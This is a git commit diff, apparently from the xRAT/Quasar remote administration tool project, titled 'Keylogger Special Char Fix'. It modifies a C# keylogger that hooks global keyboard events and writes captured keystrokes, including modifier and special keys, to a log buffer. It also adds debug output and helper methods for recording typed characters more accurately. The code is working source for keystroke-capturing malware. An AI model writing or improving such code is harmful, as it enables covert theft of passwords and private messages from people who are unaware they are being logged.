1f469151c40d24c966bcc8ccab1b816a3ac89c71
MaxXor <admin@maxxor.org>
2015-05-25 16:15:25 +0200

    Keylogger Special Char Fix
    thanks deagle #194

--- Client/Core/Keylogger/Logger.cs
+++ Client/Core/Keylogger/Logger.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
@@ -25,6 +26,7 @@ namespace xClient.Core.Keylogger
 
         private List<Keys> _pressedKeys = new List<Keys>();
         private List<char> _pressedKeyChars = new List<char>();
+        private bool _ignoreSpecialKeys = false;
 
         private IKeyboardMouseEvents _mEvents;
 
@@ -78,7 +80,7 @@ namespace xClient.Core.Keylogger
             _mEvents = events;
             _mEvents.KeyDown += OnKeyDown;
             _mEvents.KeyUp += OnKeyUp;
-            _mEvents.KeyPress += Logger_KeyPress;
+            _mEvents.KeyPress += OnKeyPress;
         }
 
         private void Unsubscribe()
@@ -87,7 +89,7 @@ namespace xClient.Core.Keylogger
 
             _mEvents.KeyDown -= OnKeyDown;
             _mEvents.KeyUp -= OnKeyUp;
-            _mEvents.KeyPress -= Logger_KeyPress;
+            _mEvents.KeyPress -= OnKeyPress;
             _mEvents.Dispose();
         }
 
@@ -107,33 +109,34 @@ namespace xClient.Core.Keylogger
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
+                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                     return;
                 }
             }
 
-            // The keys below are excluded. If it is one of the keys below,
-            // the KeyPress event will handle these characters. If the keys
-            // are not any of those specified below, we can continue.
-            if (e.KeyCode.IsExcludedKey())
+            if (!e.KeyCode.IsExcludedKey())
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
+                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                 }
             }
         }
 
         //This method should be used to process all of our unicode characters
-        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
+        private void OnKeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.Contains((Keys)char.ToUpper(e.KeyChar)))
+            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
             if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
             {
+                Debug.WriteLine("OnKeyPress Output: " + e.KeyChar);
+                _ignoreSpecialKeys = true;
                 _pressedKeyChars.Add(e.KeyChar);
                 _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
             }
@@ -153,8 +156,18 @@ namespace xClient.Core.Keylogger
             string[] names = new string[keys.Length];
             for (int i = 0; i < keys.Length; i++)
             {
-                names[i] = LoggerHelper.GetDisplayName(keys[i]);
+                if (!_ignoreSpecialKeys)
+                {
+                    names[i] = LoggerHelper.GetDisplayName(keys[i]);
+                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
+                }
+                else
+                {
+                    _pressedKeys.Remove(keys[i]);
+                }
             }
+
+            _ignoreSpecialKeys = false;
 
             if (_pressedKeys.IsModifierKeysSet())
             {
@@ -174,6 +187,7 @@ namespace xClient.Core.Keylogger
                 if (validSpecialKeys > 0)
                     specialKeys.Append("]</p>");
 
+                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                 return specialKeys.ToString();
             }
 
@@ -198,6 +212,7 @@ namespace xClient.Core.Keylogger
                 }
             }
 
+            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
             return normalKeys.ToString();
         }
 
--- Client/Core/Keylogger/LoggerHelper.cs
+++ Client/Core/Keylogger/LoggerHelper.cs
@@ -1,4 +1,5 @@
 ﻿using System.Collections.Generic;
+using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 
@@ -20,15 +21,35 @@ namespace xClient.Core.Keylogger
                 || pressedKeys.Contains(Keys.Alt));
         }
 
+        public static bool IsModifierKey(this Keys key)
+        {
+            return (key == Keys.LControlKey
+                || key == Keys.RControlKey
+                || key == Keys.LMenu
+                || key == Keys.RMenu
+                || key == Keys.LWin
+                || key == Keys.RWin
+                || key == Keys.Control
+                || key == Keys.Alt);
+        }
+
+        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c)
+        {
+            return pressedKeys.Contains((Keys)char.ToUpper(c));
+        }
+
         public static bool IsExcludedKey(this Keys k)
         {
-            return (!(k >= Keys.A && k <= Keys.Z
+            // The keys below are excluded. If it is one of the keys below,
+            // the KeyPress event will handle these characters. If the keys
+            // are not any of those specified below, we can continue.
+            return (k >= Keys.A && k <= Keys.Z
                       || k >= Keys.NumPad0 && k <= Keys.Divide
                       || k >= Keys.D0 && k <= Keys.D9
                       || k >= Keys.Oem1 && k <= Keys.OemClear
                       || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                       || k == Keys.CapsLock
-                      || k == Keys.Space));
+                      || k == Keys.Space);
         }
         #endregion
 
